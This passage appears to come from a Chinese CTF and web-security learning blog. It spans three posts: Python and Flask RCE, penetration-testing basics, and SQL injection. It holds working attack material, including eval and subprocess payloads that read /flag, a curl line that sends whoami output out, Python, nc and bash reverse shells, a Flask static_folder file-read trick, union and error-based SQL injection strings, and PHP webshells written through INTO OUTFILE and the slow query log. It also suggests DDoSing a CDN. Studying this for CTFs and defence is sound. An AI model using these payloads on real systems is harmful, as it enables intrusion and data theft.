stdout, stderr = p.communicate()

<span class="built_in">print</span>(stdout)</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250325191538567.png" alt="image-20250325191538567"></p>
<p>一般poc长这个样子</p>
<pre><code class="highlight python"><span class="keyword">import</span> subprocess
a=subprocess.Popen(<span class="string">&#x27;ls&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>].strip()
<span class="built_in">print</span>(a)</code></pre>



<h4 id="subprocess-getoutput"><a href="#subprocess-getoutput" class="headerlink" title="subprocess.getoutput"></a><code>subprocess.getoutput</code></h4><p>接收字符串格式的命令，执行命令并返回执行结果，其功能类似于os.popen(cmd).read()和commands.getoutput(cmd)。</p>
<p>用于执行系统命令,并将stdout和stderr直接捕获(不输出到终端)并以字符串形式返回</p>
<pre><code class="highlight python"><span class="keyword">import</span> os
<span class="keyword">import</span> subprocess
out=subprocess.getoutput(<span class="string">&quot;dir&quot;</span>) <span class="comment"># 到这还没有输出</span>
<span class="built_in">print</span>(out) <span class="comment">#到这才有的输出</span></code></pre>

<h4 id="subprocess-check-output"><a href="#subprocess-check-output" class="headerlink" title="subprocess.check_output"></a><code>subprocess.check_output</code></h4><p>可以理解为<code>subprocess.run</code>和<code>subprocess.getoutput</code>的结合版.会将stdout捕获作为字符串返回,同时也可以像<code>subprocess.run</code>一样使用较为复杂的自定义功能.</p>
<pre><code class="highlight python"><span class="keyword">import</span> subprocess
out=subprocess.check_output(<span class="string">&quot;dir&quot;</span>,shell=<span class="literal">True</span>,text=<span class="literal">True</span>)<span class="comment"># 到这还没有输出</span>
<span class="built_in">print</span>(out) <span class="comment">#到这才有的输出</span></code></pre>

<h4 id="subprocess-call-及check-call"><a href="#subprocess-call-及check-call" class="headerlink" title="subprocess.call() 及check_call()"></a><code>subprocess.call() </code>及<code>check_call()</code></h4><p><code>subprocess.call() </code>为python3.5以前版本使用,与<code>subprocess.run()</code>用法基本一致,但call()返回的为命令结束码,无法获取更多信息,不推荐使用,现已被run()取代.<br><code>subprocess.check_call() </code>与<code>call()</code>的区别为,<code>check_call()</code>如果命令失败(即 returncode不为0)会主动抛出<code>subprocess.CalledProcessError</code>异常,使用<code>subprocess.run(check=True)</code>可取代<code>subprocess.check_call()</code>.</p>
<h3 id="send-file"><a href="#send-file" class="headerlink" title="send_file"></a>send_file</h3><p>是类似于<code>render_template</code>和<code>redirect</code>的一种用于前后端交互的方法,可以下载指定的文件.</p>
<pre><code class="highlight python"><span class="keyword">import</span> os
<span class="keyword">import</span> subprocess
<span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for,session, send_file, Response
app = Flask(__name__)
<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span>
<span class="keyword">def</span> <span class="title function_">index</span>():
    <span class="keyword">return</span> send_file(<span class="string">&#x27;D:\\114514.docx&#x27;</span>)
<span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:
    app.run(debug=<span class="literal">True</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">5000</span>)</code></pre>

<h3 id="eval和exec"><a href="#eval和exec" class="headerlink" title="eval和exec"></a>eval和exec</h3><p>eval()和 exec()函数的功能是相似的,都可以执行一个字符串形式的 Python代码(代码以字符串的形式提供),相当于一个Python的解释器.二者不同之处在于,eval()执行完要返回结果,而exec()执行完不返回结果.</p>
<pre><code class="highlight python"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_file
app = Flask(__name__)
<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span>
<span class="keyword">def</span> <span class="title function_">index</span>():
    <span class="keyword">if</span> <span class="keyword">not</span> request.args.get(<span class="string">&quot;cmd&quot;</span>):
        <span class="keyword">return</span> send_file(<span class="string">&quot;app.py&quot;</span>)
    <span class="keyword">else</span>:
        cmd=request.args.get(<span class="string">&quot;cmd&quot;</span>)
        res=<span class="built_in">eval</span>(cmd)
        <span class="keyword">return</span> res
<span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:
    app.run(debug=<span class="literal">True</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">5000</span>)</code></pre>

<p>payload:</p>
<pre><code class="highlight python">?cmd=<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&quot;ls%20/&quot;</span>).read()
?cmd=<span class="built_in">__import__</span>(<span class="string">&quot;subprocess&quot;</span>).run(<span class="string">&quot;tac%20/flag&quot;</span>, shell=<span class="literal">True</span>,
capture_output=<span class="literal">True</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>).stdout
?cmd=<span class="built_in">__import__</span>(<span class="string">&quot;subprocess&quot;</span>).check_output(<span class="string">&quot;cat /flag&quot;</span>,
shell=<span class="literal">True</span>).decode(<span class="string">&quot;utf-8&quot;</span>)
?cmd=<span class="built_in">__import__</span>(<span class="string">&quot;subprocess&quot;</span>).getoutput(<span class="string">&quot;cat /flag&quot;</span>)
?cmd=send_file(<span class="string">&quot;/flag&quot;</span>)</code></pre>

<p>这里面的<code>__import__(&quot;os&quot;)</code>一类的用法是用于动态导入模块的.</p>
<h3 id="commands"><a href="#commands" class="headerlink" title="commands"></a>commands</h3><pre><code class="highlight plaintext">import commands
commands.getstatusoutput(&quot;ls&quot;)
commands.getoutput(&quot;ls&quot;)
commands.getstatus(&quot;ls&quot;)</code></pre>

<h3 id="ctypes"><a href="#ctypes" class="headerlink" title="ctypes"></a>ctypes</h3><pre><code class="highlight plaintext">import ctypes
ctypes.CDLL(None).system(&#x27;ls /&#x27;.encode())</code></pre>

<h3 id="threading"><a href="#threading" class="headerlink" title="threading"></a>threading</h3><pre><code class="highlight plaintext">import threading
import os

def func():
    os.system(&#x27;ls&#x27;)  # 在新的线程中执行命令

t = threading.Thread(target=func)  # 创建一个新的线程
t.start()  # 开始执行新的线程

__import__(&#x27;threading&#x27;).Thread(target=lambda: __import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)).start()</code></pre>

<h4 id="multiprocessing"><a href="#multiprocessing" class="headerlink" title="multiprocessing"></a>multiprocessing</h4><pre><code class="highlight plaintext">import multiprocessing
multiprocessing.Process(target=lambda: __import__(&#x27;os&#x27;).system(&#x27;curl localhost:9999/?a=`whoami`&#x27;)).start()</code></pre>

<h4 id="posixsubprocess"><a href="#posixsubprocess" class="headerlink" title="_posixsubprocess"></a><code>_posixsubprocess</code></h4><pre><code class="highlight plaintext">import os
import _posixsubprocess

_posixsubprocess.fork_exec([b&quot;/bin/cat&quot;,&quot;/etc/passwd&quot;], [b&quot;/bin/cat&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)

__loader__.load_module(&#x27;_posixsubprocess&#x27;).fork_exec([b&quot;/bin/cat&quot;,&quot;/etc/passwd&quot;], [b&quot;/bin/cat&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module(&#x27;os&#x27;).pipe()), False, False,False, None, None, None, -1, None, False)</code></pre>

<h4 id="pty"><a href="#pty" class="headerlink" title="pty"></a>pty</h4><pre><code class="highlight plaintext">import pty
pty.spawn(&quot;ls&quot;)</code></pre>

<h4 id="timeit"><a href="#timeit" class="headerlink" title="timeit"></a>timeit</h4><pre><code class="highlight plaintext">import timeit
timeit.timeit(&quot;__import__(&#x27;os&#x27;).system(&#x27;dir&#x27;)&quot;,number=1)</code></pre>

<h4 id="platform"><a href="#platform" class="headerlink" title="platform"></a>platform</h4><pre><code class="highlight plaintext">import platform
print platform.popen(&#x27;dir&#x27;).read()</code></pre>

<h4 id="importlib"><a href="#importlib" class="headerlink" title="importlib"></a>importlib</h4><pre><code class="highlight plaintext">import importlib
importlib.import_module(&#x27;os&#x27;).system(&#x27;ls&#x27;)
# Python3可以，Python2没有该函数
importlib.__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)</code></pre>

<h4 id="sys"><a href="#sys" class="headerlink" title="sys"></a>sys</h4><pre><code class="highlight plaintext">import sys
sys.modules[&#x27;os&#x27;].system(&#x27;calc&#x27;)</code></pre>

<h4 id="linecache"><a href="#linecache" class="headerlink" title="linecache"></a>linecache</h4><pre><code class="highlight plaintext">import linecache
linecache.os.system(&#x27;ls&#x27;)</code></pre>

<h4 id="builtins"><a href="#builtins" class="headerlink" title="builtins"></a>builtins</h4><pre><code class="highlight plaintext">exec(&quot;__import__(&#x27;os&#x27;).system(&#x27;calc&#x27;)&quot;)

eval(&#x27;__import__(&quot;os&quot;).system(&quot;calc&quot;)&#x27;)

execfile(&#x27;exp.py&#x27;)
# py2 
execfile(&quot;E:\Python27\Lib\os.py&quot;)
system(&#x27;calc&#x27;)

exec(compile(&#x27;__import__(&quot;os&quot;).system(&quot;calc&quot;)&#x27;, &#x27;&lt;string&gt;&#x27;, &#x27;exec&#x27;))</code></pre>

<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><pre><code class="highlight plaintext">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/sh&quot;)

s=__import__(&#x27;socket&#x27;).socket(__import__(&#x27;socket&#x27;).AF_INET,__import__(&#x27;socket&#x27;).SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,12345));[__import__(&#x27;os&#x27;).dup2(s.fileno(),i) for i in range(3)];__import__(&#x27;pty&#x27;).spawn(&quot;/bin/sh&quot;)</code></pre>

<p>其他</p>
<pre><code class="highlight plaintext">bdb：bdb.os、cgi.sys
cgi：cgi.os、cgi.sys</code></pre>

<h2 id="Flask-RCE利用-内存马篇"><a href="#Flask-RCE利用-内存马篇" class="headerlink" title="Flask RCE利用(内存马篇)"></a>Flask RCE利用(内存马篇)</h2><p>看过了python，但是flask和python又不是同一回事情，因为flask下有很多可供调用的函数，只能可以参考一点python的,但大多数时候是flask下特有的函数打的有问题(</p>
<h3 id="static-folder-任意文件读取"><a href="#static-folder-任意文件读取" class="headerlink" title="static_folder 任意文件读取"></a>static_folder 任意文件读取</h3><p>flask在初始化的时候 会设置很多内部的属性</p>
<pre><code class="highlight plaintext">python
def __init__(
        self,
        import_name: str,
        static_url_path: str | None = None,
        static_folder: str | os.PathLike | None = &quot;static&quot;,
        static_host: str | None = None,
        host_matching: bool = False,
        subdomain_matching: bool = False,
        template_folder: str | os.PathLike | None = &quot;templates&quot;,
        instance_path: str | None = None,
        instance_relative_config: bool = False,
        root_path: str | None = None,
    ):
    #还有一些其他的成员
self.config 用来存储配置  self.extensions 用来存储扩展的状态。
self.aborter 和 self.url_build_error_handlers 用来处理 HTTP 错误和 URL 构建错误。
self.teardown_appcontext_funcs 和 self.shell_context_processors 用来管理应用上下文和 shell 上下文。
self.blueprints 用来组织应用的模块化功能，self.url_map 管理路由规则。
self.url_map 储存了应用的路由信息
self.add_url_rule用来添加 URL 规则</code></pre>

<p>注意到是这个</p>
<pre><code class="highlight plaintext">plaintext
static_url_path: str | None = None 指定静态文件的 URL 路径（即浏览器中访问静态文件的路径）
static_folder 指定静态文件所在的文件夹路径</code></pre>

<p>如果我们修改了相关的值 就可能会造成任意文件读取</p>
<p>不过在参数传递的时候 不可以使用&#x3D;给这些东西赋值 需要使用setattr这个给他们赋值</p>
<pre><code class="highlight plaintext">plaintext
setattr(app,&#x27;_static_folder&#x27;,&#x27;/&#x27;)</code></pre>

<h3 id="路由注入"><a href="#路由注入" class="headerlink" title="路由注入"></a>路由注入</h3><h3 id><a href="#" class="headerlink" title></a></h3><h3 id="-1"><a href="#-1" class="headerlink" title></a></h3><h3 id="-2"><a href="#-2" class="headerlink" title></a></h3><h3 id="-3"><a href="#-3" class="headerlink" title></a></h3><h2 id="Flask-RCE利用-debug篇"><a href="#Flask-RCE利用-debug篇" class="headerlink" title="Flask RCE利用(debug篇)"></a>Flask RCE利用(debug篇)</h2><h2 id="一些辅助工作"><a href="#一些辅助工作" class="headerlink" title="一些辅助工作"></a>一些辅助工作</h2><p>一般会在一开始套个session 的验证</p>
<p>这里就要用到session伪造的芝士了，首先了解一下session罢</p>
<p>1）flask session 分析<br>flask对session的处理位于flask&#x2F;sessions.py中，默认情况下flask的session以cookie的形式保存于客户端，利用签名机制来防止数据被篡改。</p>
<pre><code class="highlight plaintext">.eJwljrFuwzAMBf9FcwZSpkQyP2NQoh5aBGgBO5mC_HsNdLy75d5lx7HOr3J_Hq91K_t3lnuxGamDI6kmLPpa1TE0UKteyYSpJyaaVJ8hRGZDk7ZtLlEbpALjxjOc1SaZWzLSx-aB3p0djSta984kjXqMrQqrE3WhBMo18jrX8X_D9eJ5Htifv4_1cxltCgQ3V0zvIsGBjDAlGQsqNJEi08vnD15kP8Q.XxKIMg.iW96TDgIamKLQ0x9h5LoPsUCIvw
1</code></pre>

<ul>
<li>通过.隔开的3段内容，第一段其实就是base64 encode后的内容，但去掉了填充用的等号，若decode失败，自己需要补上1-3个等号补全。中间内容为时间戳，在flask中时间戳若超过31天则视为无效。最后一段则是安全签名，将sessiondata,时间戳，和flask的secretkey通过sha1运算的结果。</li>
</ul>
<pre><code class="highlight plaintext">json-&gt;zlib-&gt;base64后的源字符串 . 时间戳 . hmac签名信息
1</code></pre>

<ul>
<li>服务端每次收到cookie后，会将cookie中前两段取出和secretkey做sha1运算，若结果与cookie第三段不一致则视为无效。</li>
<li>从cookie获取session的过程便是验证签名-&gt;验证是否过期-&gt;解码。</li>
</ul>
<p><a href="https://www.freebuf.com/articles/web/422169.html">参考文章</a>: <a href="https://blog.csdn.net/weixin_44190459/article/details/116774912">https://blog.csdn.net/weixin_44190459/article/details/116774912</a>	“flask框架漏洞”<br><a href="https://www.freebuf.com/articles/web/422169.html">参考文章</a>: <a href="https://www.cnblogs.com/meraklbz/p/18260893">https://www.cnblogs.com/meraklbz/p/18260893</a>	“python rce”</p>
]]></content>
      <tags>
        <tag>-Web -CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>一个飞舞的渗透学习实录</title>
    <url>/2025/05/08/%E4%B8%80%E4%B8%AA%E9%A3%9E%E8%88%9E%E7%9A%84%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E5%AE%9E%E5%BD%95/</url>
    <content><![CDATA[<p>—–不知道怎么形容，就叫做一个飞舞的渗透实录吧，飞舞挺飞舞的，学也真在学，唉唉，很难不着急(又幻想了，幻想不被后面来的web手打飞)，道心或许多多少少有点乱了，传统web基础有点学不进去了，搞点渗透调整一下状态吧，也刚好之后有个AWD可以练一下(我绝对不会说是为了AWD才提前开始学的。。)</p>
<p>大概会持续更新吧嗯嗯，毕竟一朝一夕也学不完的</p>
<h1 id="一个飞舞的渗透学习实录"><a href="#一个飞舞的渗透学习实录" class="headerlink" title="一个飞舞的渗透学习实录"></a>一个飞舞的渗透学习实录</h1><p>首先必须了解的就是一个完整的渗透测试的基本流程啦。。</p>
<p>根据网上可考资料，渗透大概分成这样几个流程</p>
<pre><code class="highlight plaintext">信息收集/外网打点
内网渗透
权限维持
横向移动</code></pre>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>信息收集能力，唉唉，你做web哪个不要信息收集，这东西确实需要好好训练一下</p>
<h3 id="正面信息收集"><a href="#正面信息收集" class="headerlink" title="正面信息收集"></a>正面信息收集</h3><h4 id="网页信息"><a href="#网页信息" class="headerlink" title="网页信息"></a>网页信息</h4><p>在浏览网页的时候，有时可以拿到一些有用的信息的</p>
<ul>
<li>网页的URL:可能会暴露使用的脚本语言，再向下观察网站是否有在线客服窗口，网站底部你可能在网站页面观察到的信息有：URL信息（1.例如使用的OA.xxxcom2.使用的脚本语言）、在线客服、技术支持、关于公司的联系方式（邮箱、电话号码、工作地点等）、备案号、营业执照、后台登录接口、友情链接、某些二维码等。而且你抓包基本上也能抓到底层脚本语言的&#x2F;搂出底层框架的</li>
</ul>
<h4 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h4><p>可以先根据域名摸出来对应的IP(工具：<code>nslookup、ip138</code>)</p>
<p>或者ping一下也能摸到ip，但是只能摸到一个IP(<strong>CDN</strong>的，但是我们要找的是真实的IP)</p>
<p>所以要用超级PING(<code>itdog.com</code>)</p>
<p>而要绕过IDN，需要ping一个不存在的二级域名，用邮箱(有自动回复就直接打掉了)或者用海外PING</p>
<pre><code class="highlight plaintext">不太文明的方法。。用DdOS直接把CDN打掉</code></pre>

<p><strong>端口</strong></p>
<p>​	一个网站会开放多个端口，而我们可以通过同一网站的不同端口进行测试，扫描开放端口的方法有很多，方便的话是利用工具扫描端口，其次是用在线的端口扫描网站。端口扫描工具推荐有<code>nmap,goby</code>等</p>
<p><strong>子域名</strong>&#x2F;<strong>资产测绘</strong></p>
<p>​	收集子域名可以扩大测试的范围，统一域名下的二级域名都属于目标范围</p>
<p>介绍一下子域名的相关概念</p>
<pre><code class="highlight plaintext">顶级域名(一级域名/父域名)是类似于.com .net .org .cn之类
其次的就要从右向左把优先度下降
例如下面这两个域名:mail.example.com  calendar.example.com
他们是example.com的两个子域，而example.com则是顶级域.com的子域</code></pre>

<p>常见的子域名爆破工具：<code>oneforall、layer子域名挖掘机、SubDomainsBrute</code></p>
<p>用<strong>fofa,hunter</strong></p>
<p><strong>C段旁注</strong></p>
<blockquote>
<p>那我问你，C段是什么</p>
</blockquote>
<p>一个IP地址可以这样分解:</p>
<pre><code class="highlight plaintext">192.168.0.1
A  | B |C|D</code></pre>

<p>一般C段指的是同一内网段下的其他服务器，也就是说是D段1-255中的一台服务器，C段入侵其实就是从其他服务器出发进行测试</p>
<pre><code class="highlight plaintext">测试工具:Nmap</code></pre>

<hr>
<p>旁站就是要从同一服务器下的不同网站进行提权拿下服务器从而达到拿下所有网站的目的</p>
<p>也可以用扫描器</p>
<pre><code class="highlight plaintext">fscan,dddd,ez,fscanx,milkyway,xway,灯塔//fscan和nmap有些臭名昭著了，别用少用</code></pre>

<p><strong>用户</strong></p>
<p>收集用户的信息</p>
<h4 id="资产查询"><a href="#资产查询" class="headerlink" title="资产查询"></a>资产查询</h4><p>公司名-&gt;ICP备案-&gt;子域名-&gt;IP</p>
<p>看招标文件找供应商-&gt;打进政府云</p>
<h4 id="敏感目录"><a href="#敏感目录" class="headerlink" title="敏感目录"></a>敏感目录</h4><p>这个很经典了，平常刷刷题目都会碰到的程度</p>
<p><code>dirsearch</code>一般来说够用，不多赘述</p>
<p>关注一下这些能进去的目录&#x2F;可以传参的一些带有特殊功能的页面</p>
<pre><code class="highlight plaintext">任意文件下载
后台
未授权访问
敏感信息泄露
SQL注入</code></pre>

<h4 id="web组件"><a href="#web组件" class="headerlink" title="web组件"></a>web组件</h4><p>​        各种web组件组合构成网站。</p>
<p>操作系统<br>        网站服务器有不同的操作系统：<code>windows、Linux、mac os</code>这里需要知道的是windows对大小写不敏感，其他两个对大小写敏感就行了。</p>
<p>（2）数据库<br>        目前比较常用的数据库有<code>:MySQL、SQL server、Oracle</code>等。SQL server开放的默认端口：1433，MySQL开放的默认端口：3306、Oracle开放的默认端口：1521。</p>
<p>（3）容器<br>        目前比较常见的web中间件有：<code>IIS(iis解析漏洞)，apache，tcmact，nginx，jboss</code>等。</p>
<p>（4）CMS<br>        <code>cms</code>有很多，这里就列举一部分例子：<code>dedeCMS</code>、 帝国CMS等。</p>
<p>（5）web框架<br>        web框架有<code>struts1</code>、<code>Struts2</code>、<code>Spring MVC</code>等（框架漏洞）</p>
<p>（6）web组件识别<br>        web组件识别（web指纹识别）一般可以识别出以上的网站基础信息。web指纹识别我分为在线扫描与工具识别。在线扫描的网站有：潮汐指纹识别<code>TideFinger</code> 潮汐指纹、云悉指纹yunsee.cn-2.0、强大的网站信息扫描网网站基础信息获取 - <code>ThreatScan</code> - 免费的网站在线安全检测平台-<code>TScan</code>；</p>
<p>web指纹识别工具：御剑、北极熊扫描器等；指纹识别插件有<code>wappalyzer</code>。</p>
<h3 id="侧面信息收集"><a href="#侧面信息收集" class="headerlink" title="侧面信息收集"></a>侧面信息收集</h3><h4 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h4><p>​     得到目标URL之后，我们可以通过站长之家来进行whios查询这家公司的信息。例如：公司名称，注册人或者机构、联系方式：邮箱，手机号码，备案号，ip，域名，DNS，少量子域名等。</p>
<h4 id="网络空间搜索引擎"><a href="#网络空间搜索引擎" class="headerlink" title="网络空间搜索引擎"></a>网络空间搜索引擎</h4><p>​    常用的空间搜索引擎一般有：FOFA、shodan、zoomeye。其中FOFA一般搜索到的是一些网站的信息，收集到的偏软件类信息比较多；而shodan和zoomeye则是搜索网络在线设备信息，偏向于收集硬件的信息。具体使用规则需要自己去摸索。</p>
<h4 id="Google搜索"><a href="#Google搜索" class="headerlink" title="Google搜索"></a>Google搜索</h4><p>​        Google语法是最强大的搜索手段之一，你可以收集到一些敏感页面、敏感目录、网站内可下载的文件、可能出现的sql注入点和文件上传点、未授权访问页面等。</p>
<h4 id="WAF探测"><a href="#WAF探测" class="headerlink" title="WAF探测"></a>WAF探测</h4><p>​        通过识别网站是否存在WAF以及网站存在什么样的WAF，根据自己的水平（能否绕过此类WAF）来决定还应不应该花时间耗在绕WAF上（不仅限于参加比赛）。</p>
<h4 id="一些不经常用的技巧"><a href="#一些不经常用的技巧" class="headerlink" title="一些不经常用的技巧"></a>一些不经常用的技巧</h4><pre><code class="highlight plaintext">查看github平台上有无类似本网站的源码，敏感信息，登陆的账号密码等
社工
钓鱼
SSL证书查询</code></pre>

<h2 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h2><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p>首先你要学会弹shell</p>
<pre><code class="highlight plaintext">nc:
攻击机:nc -lvvp [端口]
目标机nc &lt;攻击机IP&gt; &lt;攻击机监听的端口&gt; -e /bin/bash

bash:
攻击机:nc -lvvp [端口]
目标机:bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1</code></pre>

<h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><h2 id="清除痕迹擦屁股"><a href="#清除痕迹擦屁股" class="headerlink" title="清除痕迹擦屁股"></a>清除痕迹<del>擦屁股</del></h2>]]></content>
      <tags>
        <tag>-web -渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>从零开始的SQL注入生活</title>
    <url>/2025/03/09/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E7%94%9F%E6%B4%BB/</url>
    <content><![CDATA[<h1 id="从零开始的SQL注入生活"><a href="#从零开始的SQL注入生活" class="headerlink" title="从零开始的SQL注入生活"></a>从零开始的SQL注入生活</h1><p>字义上的从零开始喵。。字义上的私了好多次喵。。。</p>
<h2 id="Episode-1-SQL数据库基础操作"><a href="#Episode-1-SQL数据库基础操作" class="headerlink" title="Episode 1   SQL数据库基础操作"></a>Episode 1   SQL数据库基础操作</h2><ul>
<li><strong>创建</strong></li>
</ul>
<pre><code class="highlight sql"><span class="keyword">create</span> database_name;#建立一个数据库
<span class="keyword">create</span> <span class="keyword">table</span> table_name(
column1 datatype,
.......
);#建立一个表
</code></pre>



<ul>
<li><strong>查询</strong></li>
</ul>
<pre><code class="highlight sql"><span class="keyword">show</span> tables; <span class="operator">/</span><span class="operator">/</span>显示当前选中的数据库中的所有表名
<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users limit <span class="number">1</span>; <span class="operator">/</span><span class="operator">/</span>获取第一行的数据，可以通过这个方法得到表中所有的字段名，不会被大量数据顶走
<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> [表名]; #查询整表
<span class="keyword">select</span> [列名<span class="number">1</span>, 列名<span class="number">2</span>,...] <span class="keyword">from</span> [库名.表名]; #指定列查询
<span class="keyword">select</span> [表达式<span class="number">1</span>, 表达式<span class="number">2</span>,...] <span class="keyword">from</span> [库名.表名]; #查询表达式字段
group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata
<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27; &#x27;</span>
<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27; &#x27;</span>
<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> [表名] <span class="keyword">order</span> <span class="keyword">by</span> [排序字段] #排序
#条件查询<span class="keyword">Where</span>
(<span class="number">1</span>)比较运算符 (<span class="number">2</span>)<span class="keyword">BETWEEN</span> ... <span class="keyword">AND</span> ... (<span class="number">3</span>)<span class="keyword">IN</span> (<span class="number">4</span>)<span class="keyword">IS</span> <span class="keyword">NULL</span> (<span class="number">5</span>)<span class="keyword">LIKE</span> (<span class="number">6</span>)<span class="keyword">AND</span> (<span class="number">7</span>)<span class="keyword">OR</span> 
(<span class="number">8</span>)<span class="keyword">NOT</span>
<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> [表名] <span class="keyword">where</span> [条件];</code></pre>

<ul>
<li><strong>插入</strong></li>
</ul>
<pre><code class="highlight sql"><span class="keyword">insert</span> <span class="keyword">into</span> table_names (column1,column2,column3...)
<span class="keyword">insert</span> <span class="keyword">into</span> (table1,table2,table3) <span class="keyword">values</span> (value1,value2,value3) #替换键已存在的值
<span class="keyword">on</span> duplicate key <span class="keyword">update</span> ()#不会了，留个坑先(</code></pre>

<ul>
<li><strong>注马</strong></li>
</ul>
<pre><code class="highlight sql"><span class="keyword">select</span> &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot; <span class="keyword">into</span> outfile&quot;D:\\phpstudy_pro\\WWW\\shell.php&quot;
<span class="number">2.</span>利用日志文件写入木马
<span class="number">1.</span>开启日志功能

<span class="keyword">set</span> <span class="keyword">global</span> slow_query_log<span class="operator">=</span><span class="number">1</span>;
<span class="number">2.</span>设置日志存储路径

<span class="keyword">SET</span> <span class="keyword">GLOBAL</span> slow_query_log_file<span class="operator">=</span><span class="string">&#x27;D:\\phpstudy_pro\\WWW\\shell.php&#x27;</span>;
<span class="number">3.</span>执行<span class="keyword">sql</span>语句

<span class="keyword">select</span> <span class="string">&#x27;&lt;?php eval($_GET[H])?&gt;&#x27;</span> <span class="keyword">or</span> SLEEP(<span class="number">11</span>);
</code></pre>



<h2 id="episode-2-基础注入"><a href="#episode-2-基础注入" class="headerlink" title="episode 2  基础注入"></a>episode 2  基础注入</h2><h3 id="union注入-1’"><a href="#union注入-1’" class="headerlink" title="union注入(-1’)"></a>union注入(-1’)</h3><p>union注入原本是用于合并多条select查询结果；通过-1造成前面一条查询语句返回为空，从而显示我们注入的查询语句。(因为网页只能够显示一条查询记录)</p>
<pre><code class="highlight sql">#<span class="number">1.</span>查表列数
<span class="number">-1</span>’<span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span><span class="operator">~</span><span class="number">4</span>;
#查完后使用<span class="keyword">select</span> 语句
<span class="keyword">select</span> <span class="number">1</span>，<span class="number">2</span>，<span class="number">3</span>；
#查库名
<span class="number">-1</span>’<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>，database()；
#查表名
<span class="number">-1</span>’<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>’security’),<span class="number">3</span>#
#查列名
<span class="number">-1</span>’<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(column_name)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>’security’ <span class="keyword">and</span> table_name<span class="operator">=</span>’emails’),<span class="number">3</span>#
#直接查数据
<span class="number">-1</span>’<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> email_id <span class="keyword">from</span> emails limit <span class="number">2</span>,<span class="number">1</span>),<span class="number">3</span>#

#其实还是更推荐urlcode一下注释符号防止没有回弹(<span class="operator">%</span><span class="number">23</span>)</code></pre>

<p>那初学的师傅可能就会不明白这个1，2，3是什么意思</p>
<p>这个1，2，3实际是可以帮助我们快速判断列数的工具(<del>order by:那我呢？</del>)同时，这个1，2，3无关顺序，只要找到回显位并且已经爆出数据表的情况下就可以在回显位写注入语句进一步爆</p>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>1.extractvalue函数</p>
<p>查询对象xml某一个标签的值</p>
<p>如果查询的标签格式不对，就会报错</p>
<p>利用concat函数来链接两个字符串</p>
<p>查询数据库：’ and extractvalue(‘div’,concat(‘~’,database()))#</p>
<pre><code class="highlight sql"><span class="number">-1</span><span class="string">&#x27; and(select extractive(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,database())))#</span></code></pre>

<p>-&gt;查询div，~存在会报错</p>
<p>爆出~database（）</p>
<p>2.updatexml</p>
<p>更新xml文档内容</p>
<p>语法：updatexml(‘xml名’，’路径名’，更新值)；</p>
<p>同样道理，当没有对应路径的时候会报错</p>
<pre><code class="highlight plaintext">&#x27; and updatexml(&#x27;div&#x27;, concat(&#x27;~&#x27;,database()),&#x27;hi&#x27;)#
